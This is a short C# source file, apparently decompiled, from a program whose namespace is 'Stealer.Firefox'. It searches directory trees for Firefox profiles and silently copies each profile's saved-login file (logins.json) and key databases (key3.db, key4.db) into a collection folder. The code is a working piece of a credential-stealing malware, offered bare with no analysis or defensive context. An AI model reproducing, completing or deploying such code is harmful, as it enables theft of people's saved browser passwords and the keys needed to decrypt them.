using System.IO;

namespace Stealer.Firefox;

internal sealed class cLogins
{
	private static string[] keyFiles = new string[3] { "key3.db", "key4.db", "logins.json" };

	private static void CopyDatabaseFile(string from, string sSavePath)
	{
		try
		{
			if (File.Exists(from))
			{
				File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
			}
		}
		catch
		{
		}
	}

	public static void GetDBFiles(string path, string sSavePath)
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
		if (files == null)
		{
			return;
		}
		string[] array = files;
		foreach (string path2 in array)
		{
			string[] array2 = keyFiles;
			foreach (string path3 in array2)
			{
				CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
			}
		}
	}
}
